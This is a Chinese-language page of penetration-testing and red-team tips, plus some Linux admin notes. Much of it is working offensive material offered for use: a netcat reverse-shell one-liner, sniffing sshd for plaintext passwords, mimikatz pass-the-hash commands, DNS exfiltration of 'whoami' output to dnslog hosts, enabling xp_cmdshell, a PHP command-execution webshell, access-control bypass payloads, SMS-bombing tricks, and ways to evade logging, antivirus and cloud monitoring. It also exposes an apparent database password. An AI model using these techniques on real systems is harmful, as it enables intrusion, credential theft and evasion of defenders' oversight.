<p><strong>有 wsdl/soap 不知道怎么测?除了老版本awvs以外可以使用 <a href="https://github.com/SmartBear/soapui#build-and-run">soapui</a> 直接抓取目标接口,也可用 burp 插件 <a href="https://github.com/NetSPI/Wsdler">Wsdler</a></strong></p>
<hr>
<h2 id="避免记录登录日志的小技巧">避免记录登录日志的小技巧</h2>
<pre><code class="language-bash">ssh -T user@host /bin/bash -i
</code></pre>
<p>-T 代表不要分配 tty，-i 代表要一个交互型的 bash</p>
<blockquote>
<p>来自文章 : <a href="https://www.tr0y.wang/2021/06/15/linux-system-log/">Linux 系统日志小结</a></p>
</blockquote>
<hr>
<h2 id="如何关闭-httpburp-防止蜜罐探测">如何关闭 http://burp 防止蜜罐探测</h2>
<ul>
<li>Proxy - Options - Miscellaneous - Disable web interface at http://burp</li>
</ul>
<figure data-type="image" tabindex="3"><img src="./assets/img/7.png" alt="" loading="lazy"></figure>
<hr>
<h2 id="检测暗链的小技巧使用爬虫的-user-agent-遍历访问目标对比-title-和内容">检测暗链的小技巧,使用爬虫的 user-agent 遍历访问目标,对比 title 和内容</h2>
<ul>
<li>https://github.com/ffffffff0x/AboutSecurity/blob/master/Dic/Web/http/Spider.txt</li>
</ul>
<hr>
<h2 id="dns收集的优先级-被动爬取过滤-主动扫描爆破">DNS收集的优先级 被动+爬取+过滤 &gt; 主动扫描+爆破</h2>
<ul>
<li>可以使用这种思路 rapid7公共数据集+js爬取+Github等第三方爬取+subfinder+OneForAll+ksubdomain过滤</li>
</ul>
<hr>
<h2 id="对于未知的webshell可以尝试爆破路径-密码">对于未知的webshell，可以尝试爆破路径、密码</h2>
<ul>
<li>webshell路径字典 : https://github.com/ffffffff0x/AboutSecurity/blob/master/Dic/Web/Webshell/Fuzz_dir.txt</li>
<li>webshell密码字典 : https://github.com/ffffffff0x/AboutSecurity/blob/master/Dic/Web/Webshell/Fuzz_webshell_pass.txt</li>
</ul>
<h2 id="也加一些参数尝试报错看会不会有密码">也加一些参数,尝试报错,看会不会有密码</h2>
<hr>
<h2 id="nc-用的不爽可以尝试换个-reverse-shell-工具推荐个-httpsgithubcomnodaufgirsh-go写的可以自动检测os并执行正确的命令将其升级为一个完整的交互式反向shell">nc 用的不爽可以尝试换个 reverse-shell 工具,推荐个 https://github.com/nodauf/Girsh ,go写的,可以自动检测OS并执行正确的命令，将其升级为一个完整的交互式反向shell。</h2>
<figure data-type="image" tabindex="4"><img src="./assets/img/5.png" alt="" loading="lazy"></figure>
<hr>
<h2 id="从反编译的-apk-文件中提取相关域名链接ip">从反编译的 apk 文件中提取相关域名链接/IP</h2>
<pre><code class="language-bash">grep -E &quot;([0-9]{1,3}[\.]){3}[0-9]{1,3}&quot; -r xxx --color=auto
grep -E &quot;https?://[a-zA-Z0-9\.\/_&amp;=@$%?~#-]*&quot; -r xxx --color=auto
</code></pre>
<hr>
<h2 id="通过正则从-apk-中提取一些敏感信息">通过正则从 apk 中提取一些敏感信息</h2>
<pre><code class="language-bash">apktool d app_name.apk
grep -EHirn &quot;accesskey|admin|aes|api_key|apikey|checkClientTrusted|crypt|http:|https:|password|pinning|secret|SHA256|SharedPreferences|superuser|token|X509TrustManager|insert into&quot; APKfolder/
</code></pre>
<hr>
<h2 id="如果登录系统设置了-ip-地址白名单我们可以通过修改-http-头字段伪造-ip-地址">如果登录系统设置了 IP 地址白名单,我们可以通过修改 http 头字段伪造 IP 地址</h2>
<ul>
<li>http 头字段字典 : https://github.com/ffffffff0x/AboutSecurity/blob/master/Dic/Web/http/Fuzz_head.txt</li>
</ul>
<p>或者直接修改 host 头</p>
<pre><code>curl -v -H &quot;Host: localhost&quot; https://target/
wget -d --header=&quot;Host: localhost&quot; https://target/
</code></pre>
<hr>
<p>有时候文件太大,想先确认一下文件结构和部分内容,这时可以使用 remotezip,直接列出远程 zip 文件的内容，而无需完全下载,甚至可以远程解压,仅下载部分内容</p>
<pre><code class="language-bash">pip3 install remotezip
remotezip -l &quot;http://site/bigfile.zip&quot;          # 列出远程zip文件的内容
remotezip &quot;http://site/bigfile.zip&quot; &quot;file.txt&quot;  # 从远程zip⽂件解压出file.txt
</code></pre>
<hr>
<p>URL跳转漏洞字典: https://github.com/ffffffff0x/AboutSecurity/blob/master/Dic/Web/api_param/Fuzz_Redirect.txt</p>
<hr>
<p>burp 在忽略目标的时候是配置 Intercept Client Requests , 但是这个选项不支持批量导入, 只能一条一套的添加, 非常反人类, 所以 windows 下可以通过 Proxifier 配置 Rules 做到忽略指定的 host</p>
<figure data-type="image" tabindex="5"><img src="./assets/img/4.png" alt="" loading="lazy"></figure>
<p>附赠一个 Target hosts 列表</p>
<ul>
<li>https://github.com/ffffffff0x/AboutSecurity/blob/master/Payload/Burp/Proxifier_filter.txt</li>
</ul>
<hr>
<p>npm 和 github 加速可以使用 jsdelivr 的 cdn 进行加速,但 jsdelivr 不支持 release 的发布文件下载,可以采用 cf worker 部署的代理服务进行加速</p>
<hr>
<p>在 linux 中不知道当前用户可用什么命令，可以使用下面的命令，这条命令可以列出所有可用的命令(有点拗口)</p>
<pre><code>compgen -c
</code></pre>
<hr>
<h2 id="火绒拦截扫描如何关闭拦截">火绒拦截扫描，如何关闭拦截？</h2>
<ul>
<li>火绒&gt;网络防护&gt;基础防护中关闭</li>
</ul>
<figure data-type="image" tabindex="6"><img src="./assets/img/1.png" alt="" loading="lazy"></figure>
<hr>
<h2 id="druid-未授权访问常见路径">druid 未授权访问常见路径</h2>
<ul>
<li>/druid/websession.html</li>
<li>/system/druid/websession.html</li>
<li>/webpage/system/druid/websession.html</li>
</ul>
<hr>
<h2 id="爆破目标用户名时应考虑如下可能">爆破目标用户名时应考虑如下可能：</h2>
<ul>
<li>撞库</li>
<li>常见手机号</li>
<li>常见登录账号(admin、manager、test、deme)</li>
<li>数字组合(0-9、00-99、000-999、0000-9999、00000-99999)</li>
<li>拼音(zhangsan、zhang.san、zhangs)</li>
<li>中文(张三、李四、张san)</li>
<li>英文名(Tom、Jeo、Cherry)</li>
<li>单位名(zssx123、zssx@123)</li>
<li>地名(beijing123、beijing@123)</li>
<li>组合(地名+单位名)</li>
<li>域名(baidu@123、JD@123)</li>
<li>生日组合</li>
</ul>
<hr>
<h2 id="整理字典时推荐用linux下的工具快速合并和去重">整理字典时，推荐用linux下的工具快速合并和去重</h2>
<pre><code class="language-bash">cat file1.txt file2.txt fileN.txt &gt; out.txtsort out.txt | uniq &gt; out2.txt
</code></pre>
<hr>
<h2 id="信息收集小技巧仔细观察目标页面的js路径多找几个js目录专门用js字典进行爆破获取的js脚本列表再调用工具去匹配路径和凭证">信息收集小技巧，仔细观察目标页面的js路径，多找几个js目录，专门用js字典进行爆破，获取的js脚本列表，再调用工具去匹配路径和凭证。</h2>
<hr>
<h2 id="有时一些上传点没有过滤但你访问文件是通过函数调用获取文件这个时候可以先测下任意文件读然后尝试get改为post在测试任意文件读如果存在尝试通过任意文件读找路径">有时一些上传点没有过滤,但你访问文件是通过函数调用获取文件,这个时候可以先测下任意文件读,然后尝试get改为post在测试任意文件读,如果存在,尝试通过任意文件读找路径</h2>
<hr>
<p>打某一个行业想要有成果，最好要深入了解这个行业，我举个例子，比如搞传奇/dnf这种私服的，他们讲管理员都叫gm，不像搞IT的叫admin，那你爆一些私服游戏的网页后台、管理账号就需要搞一些行业黑话生成一下，比如/gm/或者/chongzhi/gm.php,用IT行业的字典，水土不服🤣，还有菠菜行业，注册用户需要6位邀请码，很多都是888888、666666这种吉利数字，逆向一下思路，猜一猜目标受众喜欢什么。</p>
<hr>
<p>我们在后渗透过程中经常要传 payload 到目标，临时起的文件服务器都是 python 一条命令的事</p>
<ul>
<li>
<p>Python 2.x</p>
<pre><code class="language-bash">python -m SimpleHTTPServer 8000# 在当前目录起个 8000 端口的 HTTP 服务
</code></pre>
</li>
<li>
<p>Python 3.x</p>
<pre><code class="language-bash">python -m http.server 8000 --bind 0.0.0.0
</code></pre>
</li>
<li>
<p>推荐一个可以加密码的，一条命令python服务器模块</p>
<pre><code>pip3 install updogupdog --port 8888 --password test1234
</code></pre>
</li>
</ul>
<hr>
<p>一般来说,某些场景多个服务是协同的关系,比如就这个 LiveCMS 服务一定和下面的监控设备有连接，不然日志不会这么大，可以搞一搞下级监控，也可以专门搞一搞这个 LiveCMS 和 LiveSMS、LiveGBS 试试<br>
LiveCMS 端口使用</p>
<ul>
<li>TCP 端口 : 5060(SIP), 10000(HTTP), 26379(Redis)</li>
<li>UDP 端口 : 5060(SIP)</li>
</ul>
<p>LiveSMS : SIP 流媒体服务, 根据需要可部署多套</p>
<ul>
<li>TCP 端口 : 5070(SIP), 10001(HTTP), 11935(RTMP Live), 30000-40000(RTP over TCP)</li>
<li>UDP 端口 : 5070(SIP), 50000-60000(RTP/RTCP over UDP)</li>
</ul>
<hr>
<p>有时候我们拿了一台 docker 机器，发现没有 ifconfig 命令也没有 ip 命令，不清楚怎么看 IP，这时候可以通过查看 proc 文件的方式来查看</p>
<pre><code class="language-bash">cat /proc/net/fib_triecat /etc/sysconfig/network
</code></pre>
<hr>
<p>渗透时遇到某些上传点未作过滤，但负载均衡做了过滤后缀名的情况，可以上传 webshell 命名为 index.php，然后访问 xxx.com/xxx/upload, 尝试 bypass 反代的策略</p>
<hr>
<p>当渗透时遇到了 403 或者 302、401 的拒绝访问，不要怕，多 FUZZ 几次</p>
<ul>
<li>
<p>从 HTTP Header 层面 bypass</p>
<pre><code class="language-bash">GET /admin HTTP/1.1Host: web.com   # ===&gt; 403GET /anything HTTP/1.1Host: web.comX-Original-URL: /admin  # ===&gt; 200GET /anything HTTP/1.1Host: web.comReferer: https://web.com/admin  # ===&gt; 200GET https://qq.com HTTP/1.1Host: web.com   # ===&gt; SSRF
</code></pre>
</li>
<li>
<p>从 URL 参数层面 bypass</p>
<pre><code class="language-bash">/admin/panel    # ===&gt; 403/admin/monitor  # ===&gt; 200/admin/monitor/;panel   # ===&gt; 302
</code></pre>
<pre><code class="language-bash">web.com/admin   # ===&gt; 403web.com/ADMIN       # ===&gt; 200web.com/admin/      # ===&gt; 200web.com/admin/.     # ===&gt; 200web.com//admin//    # ===&gt; 200web.com/./admin/./  # ===&gt; 200web.com/./admin/..  # ===&gt; 200web.com/%2f/admin/  # ===&gt; 200web.com/admin.json  # ===&gt; 200(ruby)web.com/%2e/admin   # ===&gt; 200web.com/%252e/admin # ===&gt; 200web.com/%ef%bc%8fadmin  # ===&gt; 200web.com/admin       # ===&gt; 302web.com/admin..;/   # ===&gt; 200
</code></pre>
</li>
<li>
<p>从协议层面 bypass</p>
<pre><code class="language-bash">http://web.com/admin    # ===&gt; 403https://web.com/admin   # ===&gt; 200
</code></pre>
</li>
</ul>
<hr>
<p>当我们拿下 windows 机器时可以通过抓内存中的密码进行横向，但 linux 却不可能抓到内存中的密码，但是 Debian 系列下的 linux 系统可以通过监听 sshd 进程的数据抓取出明文密码，比如你拿下了一台管理员机器，上面有 xshell，你可以手动开一个监听，在开一个登录，监听的窗口上就抓出密码了</p>
<pre><code class="language-bash">strace -xx -fp `cat /var/run/sshd.pid` 2&gt;&amp;1| grep --line-buffered -P 'write\(\d, &quot;\\x00' | perl -lne '$|++; @F=/&quot;\s*([^&quot;]+)\s*&quot;/g;for (@F){tr/\\x//d}; print for @F'|grep --line-buffered -oP '.{8}\K([2-7][0-9a-f])*$'|grep --line-buffered -v '^64$'|perl -pe 's/([0-9a-f]{2})/chr hex $1/gie'
</code></pre>
<p>当然你也可以直接用工具抓 xshell 存的密码</p>
<ul>
<li><a href="https://github.com/Arvanaghi/SessionGopher">Arvanaghi/SessionGopher</a> - 使用 WMI 提取 WinSCP、PuTTY、SuperPuTTY、FileZilla 和 Microsoft remote Desktop 等远程访问工具保存的会话信息的 ps 脚本</li>
<li><a href="https://github.com/uknowsec/SharpDecryptPwd">uknowsec/SharpDecryptPwd</a> - 对密码已保存在 Windwos 系统上的部分程序进行解析,包括：Navicat,TeamViewer,FileZilla,WinSCP,Xmangager 系列产品(Xshell,Xftp)。</li>
</ul>
<hr>
<p>渗透时尽量不要暴露自己的 IP 地址，挂代理是必须的</p>
<ul>
<li>linux 下要查看自己终端是否走代理可以 curl https://ifconfig.me/ 看下返回的 IP 地址</li>
<li>windows 就直接访问 https://ifconfig.me/ 即可</li>
</ul>
<hr>
<p>linux 下代理不用多说, proxychains-ng，windows 下推荐用 Proxifier</p>
<hr>
<p>MSF 和 CS 中 Stage 与 Stageless 的区别</p>
<ul>
<li>Stage ： 先传一个 shellcode，然后回连端口，加载恶意 metsrv，然后再请求 stdapi 于 priv，进行上线</li>
<li>Stageless ： 将 shellcode、metsrv、stdapi、priv 打包，一次性传完</li>
<li>如果想让 msf 直接回弹到 NC，那么必须要用 stageless</li>
</ul>
<hr>
<p>判断目标主机是不是虚拟机、容器</p>
<ul>
<li>
<p>windows</p>
<ul>
<li>cmd : systeminfo</li>
<li>Powershell : get-wmiobject win32_computersystem | fl model</li>
</ul>
</li>
<li>
<p>linux</p>
<pre><code class="language-bash">lshw -class system | grep -i VM &amp; grep -i virtualdmesg | grep -i VM &amp; grep -i virtualdmidecode -s system-product-namels /tmpsystemd-detect-virtvirt-whatls -alh /.dockerenvcat /proc/1/cgroup
</code></pre>
</li>
</ul>
<hr>
<p>msf 框架其实有许多 UI 界面的工具, 可以帮助不习惯命令行的渗透测试人员进行渗透，我举几个例子</p>
<ul>
<li>https://github.com/FunnyWolf/Viper</li>
<li>https://github.com/WayzDev/Kage</li>
</ul>
<hr>
<p>在进行云主机后渗透时，如果触发敏感操作，会有短信提醒到管理员手机上，这个时候可以酌情考虑卸载云主机的监控 (有时你用云主机装 SSR 会无法连接也是这个原因)</p>
<hr>
<p>rlwrap 工具，可以完美解决各类 shell 中无法上下左右的问题</p>
<p>例如 ，回弹了 shell，手贱按了上，这种情况(我想你一定遇到过🤣🤣🤣🤣)</p>
<ul>
<li>
<p>安装：</p>
<pre><code class="language-bash">apt install rlwrap
</code></pre>
</li>
<li>
<p>使用：</p>
<pre><code class="language-bash">rlwrap [Command]
</code></pre>
</li>
</ul>
<hr>
<p>cAdvisor 是 Google 出品的用于监控 Docker 容器的服务，渗透时遇到这个服务基本上是存在容器环境</p>
<hr>
<p>新版 kali 2020 版后使用 root 账号默认不给密码，如果你想,可以直接进行修改 : sudo passwd root</p>
<hr>
<p>nc 具有多个版本, 比如: traditional、openbsd、ncat</p>
<ul>
<li>
<p>traditional 最老的版本,支持最基本的功能</p>
</li>
<li>
<p>openbsd 安全版本,回弹要用一大段命令</p>
<pre><code class="language-bash">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 4242 &gt;/tmp/f
</code></pre>
</li>
<li>
<p>ncat 新版本, 重构了旧版的代码并支持了许多新功能, debian 系列发行版下通过以下命令进行安装配置</p>
<pre><code class="language-bash">apt install -y ncatupdate-alternatives --set nc /usr/bin/ncat
</code></pre>
</li>
</ul>
<hr>
<p>程序溢出，int 最大值为 2147483647，可尝试使用该值进行整数溢出，观察现象。</p>
<blockquote>
<p>来自项目 : <a href="https://github.com/Power7089/PenetrationTest-Tips">Power7089/PenetrationTest-Tips</a></p>
</blockquote>
<hr>
<p>图片验证码可设置为空，如：code=undefined</p>
<blockquote>
<p>来自项目 : <a href="https://github.com/Power7089/PenetrationTest-Tips">Power7089/PenetrationTest-Tips</a></p>
</blockquote>
<p>也可以使用字典进行 fuzz</p>
<ul>
<li>https://github.com/ffffffff0x/AboutSecurity/blob/master/Dic/Web/api_param/Fuzz_imagesize.txt</li>
</ul>
<hr>
<p>任意文件下载：/porc/self/cmdline -- 当前进程的 cmdline 参数，/var/lib/mlocate/mlocate.db -- 全文件路径。</p>
<blockquote>
<p>来自项目 : <a href="https://github.com/Power7089/PenetrationTest-Tips">Power7089/PenetrationTest-Tips</a></p>
</blockquote>
<hr>
<ul>
<li>138888888889   12 位经过短信网关取前 11 位，导致短信轰炸</li>
<li>短信轰炸绕过：手机号前加 + 86 有可能会绕过，手机号输入邮箱，邮箱处输入手机号</li>
<li>手机号码前后加空格，86，086，0086，+86，0，00，/r,/n, 以及特殊符号等</li>
<li>手机号前加若干 + 会造成短信轰炸</li>
<li>获取短信验证码时，用逗号隔开两个手机号，有可能两个手机号能获取到同一个验证码</li>
</ul>
<blockquote>
<p>来自项目 : <a href="https://github.com/Power7089/PenetrationTest-Tips">Power7089/PenetrationTest-Tips</a></p>
</blockquote>
<hr>
<h1 id="蓝队">蓝队</h1>
<p>流量分析除了 wireshark 用科来的工具进行分析也是个不错的选择，有时候做 ctf 的分析题，直接用科来工具打开就可以发现异常包，还是挺有帮助的</p>
<hr>
<p>CobaltStrike 的 Fofa 语法</p>
<pre><code>cert=&quot;73:6B:5E:DB:CF:C9:19:1D:5B:D0:1F:8C:E3:AB:56:38:18:9F:02:4F&quot;
</code></pre>
<hr>
<p>红队常用的扫描器特征</p>
<ul>
<li>https://github.com/ffffffff0x/AboutSecurity/blob/master/Dic/Web/http/RedTeam.txt</li>
</ul>
<hr>
<p>&quot;Beacon.dll&quot;、&quot;beacon.x64.dll&quot; 和 &quot;ReflectiveLoader&quot; 默认是 CS Beacon 的硬编码特征。当寻找内存中的后门时，可以利用这一点</p>
<figure data-type="image" tabindex="7"><img src="./assets/img/2.png" alt="" loading="lazy"></figure>
<hr>
<h1 id="linux">Linux</h1>
<p>当运行一个程序发现缺少库时,可以使用 apt-file 进行搜索，然后安装对应的软件包</p>
<pre><code class="language-bash">apt install apt-fileapt-file updateapt-file search &lt;xxx&gt;apt install &lt;xxx&gt;
</code></pre>
<blockquote>
<p>来自项目 : <a href="https://github.com/firmianay/Tips-for-Geek">firmianay/Tips-for-Geek</a></p>
</blockquote>
<hr>
<p>用于文本处理的几个工具</p>
<ul>
<li>tr : 多功能处理</li>
<li>https://github.com/tomnomnom/anew : 自动去重</li>
<li>jq : json 格式化</li>
<li>expand/unexpand : 空格和 TAB 转换</li>
</ul>
<hr>
<p>命令行下截图的一种不错的方式</p>
<ul>
<li>asciinema</li>
</ul>
<hr>
<p>神器级工具,Linux 下的 everything</p>
<ul>
<li>https://github.com/junegunn/fzf</li>
</ul>
<figure data-type="image" tabindex="8"><img src="./assets/img/6.png" alt="" loading="lazy"></figure>
<hr>
<p>推荐一个 linux 小工具 trash-cli 用于移动文件到回收站，同时会记录文件的原地址、删除日期和权限。trash-cli 和 KDE、GNOME、XFCE 使用同一个回收站，你可以在命令行或脚本运行 trash-cli。一定程度上可以代替 rm</p>
<ul>
<li>地址:https://github.com/andreafrancia/trash-cli/blob/master/README_zh-CN.rst</li>
</ul>
<hr>
<p>一个探针工具，可用于实时监测服务器运行状况</p>
<ul>
<li>地址:https://github.com/naiba/nezha</li>
</ul>
<hr>
<p>linux 使用过程中经常出现安装软件包失败的问题,很多情况是遇到了锁,可以直接删除(运维兄弟们,生产环境下不要用啊🤣🤣🤣)</p>
<ul>
<li>
<p>debian系<br>
报错：无法获得锁 /var/lib/apt/lists/lock - open (11: 资源暂时不可用)</p>
<pre><code class="language-bash">rm -rf /var/cache/apt/archives/lockrm -rf /var/lib/dpkg/lock-frontendrm -rf /var/lib/dpkg/lockrm /var/lib/dpkg/lockrm /var/lib/apt/lists/lock
</code></pre>
</li>
<li>
<p>redhat系<br>
报错：/var/run/yum.pid 已被锁定,PID 为 xxxx 的另一个程序正在运行.</p>
<pre><code class="language-bash">rm -f /var/run/yum.pid 2&gt; /dev/null
</code></pre>
</li>
<li>
<p>特立独行的 Fedora<br>
报错：Waiting for process with pid <xxx> to finish.</p>
<pre><code class="language-bash">rm -f /var/cache/dnf/metadata_lock.pid 2&gt; /dev/null
</code></pre>
</li>
</ul>
<hr>
<p>在 linux 中安装一些组件的依赖时会有比如 python-dev 和  python-devel 的区别,devel 或 dev 包主要是供开发用，这代表不同的发行版本，redhat 系是 devel ，debian 系是 dev</p>
<hr>
<p>修改 Linux 的 DNS 一直是一个问题，每次开机 dns 都会重置，debian 下可以使用 dns 管理工具一劳永逸的解决</p>
<ul>
<li>
<p>安装</p>
<pre><code class="language-bash">apt-get install -y resolvconf
</code></pre>
</li>
<li>
<p>配置</p>
<pre><code class="language-bash">echo &quot;nameserver 223.5.5.5&quot; &gt; /etc/resolvconf/resolv.conf.d/head
</code></pre>
</li>
<li>
<p>更新</p>
<pre><code class="language-bash">resolvconf -u
</code></pre>
</li>
<li>
<p>若需要更改 DNS,请修改 <code>/etc/resolvconf/resolv.conf.d/head</code> 文件</p>
</li>
</ul>
<hr>
<p>如果在 red hat 系发行版中需要装开发工具,建议安装 Development Tools ，可以将常用软件，一次性装好</p>
<ul>
<li>
<p>安装</p>
<pre><code class="language-bash">yum groupinstall -y &quot;Development Tools&quot;
</code></pre>
</li>
</ul>
<hr>
<p>分享几个linux性能调优的技巧</p>
<pre><code class="language-bash">sync    # sync 命令做同步,以确保文件系统的完整性,将所有未写的系统缓冲区写到磁盘中,包含已修改的 i-node、已延的块 I/O 和写映射文件.否则在释放缓存的过程中,可能会丢失未保存的文件.echo 1 &gt; /proc/sys/vm/drop_caches   # 清理 pagecache(页面缓存)echo 2 &gt; /proc/sys/vm/drop_caches   # 清理 dentries(目录缓存)和inodesecho 3 &gt; /proc/sys/vm/drop_caches   # 清理 pagecache、dentries 和 inodessync# 取消开启文件数限制ulimit -n 65535# 优化内存echo 128 &gt; /proc/sys/vm/nr_hugepages        # 默认为0sysctl -w vm.nr_hugepages=128
</code></pre>
<hr>
<p>最近在 linux 搭建 vpn 服务的时候遇到时间和时区不同步的情况，分享下解决方案</p>
<p>查看当前时区</p>
<pre><code class="language-bash">timedatectl
</code></pre>
<p>修改当前时区：</p>
<pre><code class="language-bash">timedatectl set-timezone Asia/Shanghai# 或cp  /usr/share/zoneinfo/Asia/Shanghai  /etc/localtime
</code></pre>
<hr>
<p>由于 python 官方停止了对 python2 的维护，以后大部分和 pip2 有关的操作都会报下面这个错，我预估一下，这个应该是以后我们遇到最常见的问题之一, 解决方案很简单, 安装指定版本的 pip2 即可</p>
<figure data-type="image" tabindex="9"><img src="./assets/img/3.png" alt="" loading="lazy"></figure>
<pre><code>curl https://bootstrap.pypa.io/2.7/get-pip.py --output get-pip.pypython get-pip.py
</code></pre>
<hr>
<p>Python 2 在 Ubuntu 20 上不存在，但是有时候还是需要的。可以通过以下命令安装</p>
<pre><code class="language-bash">apt-get install python-is-python2
</code></pre>
<hr>
<hr>
<h4 id="cve-2020-14386-linux-kernel权限提升漏洞">CVE-2020-14386: Linux kernel权限提升漏洞 :</h4>
<p><strong>内核提权漏洞</strong>，poc：https://www.openwall.com/lists/oss-security/2020/09/03/3</p>
<hr>
<p><strong>php imap命令执行：imap_open调用rsh连接远程，但是debain默认使用ssh，ssh存在-o雕鹰系统命令，因此存在命令注入。</strong></p>
<figure data-type="image" tabindex="10"><img src="http://showdoc.wiki.com.qax/server/index.php?s=/api/attachment/visitFile/sign/f418b83f0debd061f1d5978f256b5758" alt="" loading="lazy"></figure>
<hr>
<p>**各种waf：**https://mp.weixin.qq.com/s/PWkqNsygi-c_S7tW1y_Hxw</p>
<hr>
<p><strong>excel导入打xxe</strong></p>
<p>https://xz.aliyun.com/t/3741</p>
<hr>
<p><strong>启动apache</strong></p>
<pre><code>/etc/init.d/apache2 start
</code></pre>
<hr>
<p><strong>ssh软连接</strong></p>
<p>https://www.jozxing.cc/archives/1653</p>
<hr>
<p><strong>apache shiro</strong></p>
<p>https://www.cnblogs.com/nul1/p/12827021.html</p>
<hr>
<p><strong>提权合集</strong></p>
<p>https://mp.weixin.qq.com/s/gijFjloNrEshsSaiMHr8oQ</p>
<hr>
<p><strong>jwt</strong></p>
<p>https://xz.aliyun.com/t/6776#toc-10</p>
<hr>
<p><strong>winrm 执行命令、端口复用</strong></p>
<p>https://blog.csdn.net/k8gege/article/details/106442655</p>
<hr>
<p><strong>红队工具</strong></p>
<p>https://github.com/root-tools/redtool</p>
<hr>
<p><strong>pth+rdp</strong></p>
<p>https://www.dazhuanlan.com/2020/01/18/5e22c1493adef/</p>
<pre><code>privilege::debug
sekurlsa::pth /user:administrator /domain:. /ntlm:xxxxxxxxxxxxxxxxxxxxxx &quot;/run:mstsc.exe /restrictedadmin&quot;
Copy
条件：
Server需要开启Restricted Admin mode
Windows 7 和 Windows Server 2008 R2默认不支持，需要安装补丁2871997、2973351
Copy
</code></pre>
<p><strong>开启Restricted Admin mode:</strong></p>
<pre><code>REG ADD HKLM\System\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 00000000 /f
Copy
</code></pre>
<hr>
<p><strong>设备默认口令</strong></p>
<p>http://www.srxh1314.com/mrkl.html</p>
<hr>
<p><strong>ue上传</strong></p>
<p>https://zhuanlan.zhihu.com/p/42888106</p>
<hr>
<p>**<br>
无回显外带**</p>
<pre><code>cmd /v /c &quot;whoami &gt; temp &amp;&amp; certutil -encode temp temp2 &amp;&amp; findstr /L /V &quot;CERTIFICATE&quot; temp2 &gt; temp3 &amp;&amp; set /p MYVAR=&lt; temp3 &amp;&amp; set FINAL=!MYVAR!.b9530dbeff7692920356.d.zhack.ca &amp;&amp; nslookup !FINAL!&quot;

或

for /F &quot;delims=\ tokens=2&quot; %i in ('whoami') do ping -n 1 %i.bm21t3.dnslog.cn
Copy
</code></pre>
<hr>
<p><strong>pth + rdp</strong></p>
<pre><code>sekurlsa::pth /user:administrator /domain:. /ntlm:xxxxxxxxxxxxxxxxxxxxxx &quot;/run:mstsc.exe /restrictedadmin&quot;
Copy
</code></pre>
<hr>
<p><strong>清除日志</strong></p>
<figure data-type="image" tabindex="11"><a href="https://p6-tt-ipv6.byteimg.com/large/pgc-image/b2f859ff474f4dabb7390f10ea1dff59"><img src="https://p6-tt-ipv6.byteimg.com/large/pgc-image/b2f859ff474f4dabb7390f10ea1dff59" alt="img" loading="lazy"></a></figure>
<hr>
<p><strong>linux提权：</strong></p>
<p>https://mp.weixin.qq.com/s?__biz=MjM5NjA0NjgyMA==&amp;mid=2651102317&amp;idx=1&amp;sn=0b0a840bd30896eb28b02ac117700bad&amp;chksm=bd1f0ee68a6887f00b1bfbf8996d516abfed498e264561e4d022de359beacb96efe10c000733&amp;scene=132#wechat_redirect</p>
<hr>
<p><strong>mssql cmd</strong></p>
<pre><code>-- 判断用户
and 1=(select IS_SRVROLEMEMBER('public') )--
and 1=(select IS_SRVROLEMEMBER('sysadmin') )--
and 1=(select IS_SRVROLEMEMBER('db_owner') )--

-- 开启xp_cmdshell
EXEC sp_configure 'show advanced options',1
RECONFIGURE

EXEC sp_configure 'xp_cmdshell',1
RECONFIGURE

EXEC master..xp_cmdshell '123.zpu2he.dnslog.cn'

-- RECONFIGURE报错的话就用
reconfigure with override
Copy
</code></pre>
<hr>
<p><strong>mysqldump</strong></p>
<pre><code>mysqldump --defaults-extra-file=/tmp/11.cnf --databases jiebei_com &gt;/home/www/jb.com/runtime/log/202010/jiebei_com.sql
Copy
[client]
port = 3306
socket = /tmp/mysql.sock
default-character-set = utf8mb4
host = 127.0.0.1
user = 'jiebei_com'
password = 'k7SHT62npa3j8RrS'
Copy
</code></pre>
<hr>
<p><strong>SimplyEmail</strong></p>
<pre><code>./SimplyEmail.py -all -v -e 
Copy
</code></pre>
<hr>
<p><strong>xray扫描</strong></p>
<pre><code>.\xray_windows_amd64.exe webscan --listen 127.0.0.1:7777 --html-output zyhy3.htmlpython3 lancher.pyCopy
</code></pre>
<hr>
<p><strong>易受攻击点</strong></p>
<p>https://mp.weixin.qq.com/s/6I-Yp0A69rLr3RfruIAkhA</p>
<hr>
<p><strong>cisco asa任意文件读取</strong></p>
<p>https://github.com/cygenta/CVE-2020-3452/blob/main/CVE-2020-3452.py</p>
<hr>
<h4 id="exchange-cve-2020-17144">Exchange CVE-2020-17144</h4>
<p>poc: https://srcincite.io/pocs/cve-2020-17141.py.txt</p>
<h4 id="cve-2020-16875">CVE-2020-16875</h4>
<p>poc: https://srcincite.io/pocs/cve-2020-16875.py.txt</p>
<hr>
<p><strong>citrix xenmobile任意文件读取</strong></p>
<pre><code>/jsp/help-sb-download.jsp?sbFileName=../../../etc/passwdCopy
</code></pre>
<hr>
<p>vmware文件读取：</p>
<p>https://twitter.com/ptswarm/status/1316016337550938122</p>
<hr>
<p>内网不出网</p>
<p>https://mp.weixin.qq.com/s/IeH06p7pkQ3lmOehGLUWLg</p>
<p>dnscat</p>
<hr>
<p>mysql 8.0新特性</p>
<ul>
<li>
<p>table:</p>
<pre><code>TABLE table_name [ORDER BY column_name] [LIMIT number [OFFSET number]]Copy
</code></pre>
</li>
</ul>
<figure data-type="image" tabindex="12"><a href="https://xzfile.aliyuncs.com/media/upload/picture/20201210193347-9156b91a-3adb-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20201210193347-9156b91a-3adb-1.png" alt="img" loading="lazy"></a></figure>
<figure data-type="image" tabindex="13"><img src="http://showdoc.wiki.com.qax/server/index.php?s=/api/attachment/visitFile/sign/dd86f8549cd48edfee1ba56eb73fe7bf" alt="" loading="lazy"></figure>
<ul>
<li>
<p>value:</p>
<pre><code>select * from users where id = 1 union values row(1,2,3)Copy
</code></pre>
<hr>
</li>
</ul>
<p>当php system没有调用cmd权限</p>
<p>通过建立新的com对象调用其他的cmd.exe</p>
<pre><code>&lt;?php$command=$_POST[a];$wsh = new COM('WScript.shell');   // 生成一个COM对象$exec = $wsh-&gt;exec('cmd.exe /c '.$command); //调用对象方法来执行命令$stdout = $exec-&gt;StdOut();$stroutput = $stdout-&gt;ReadAll();echo $stroutput?&gt;Copy
</code></pre>
<hr>
<p>xss payload</p>
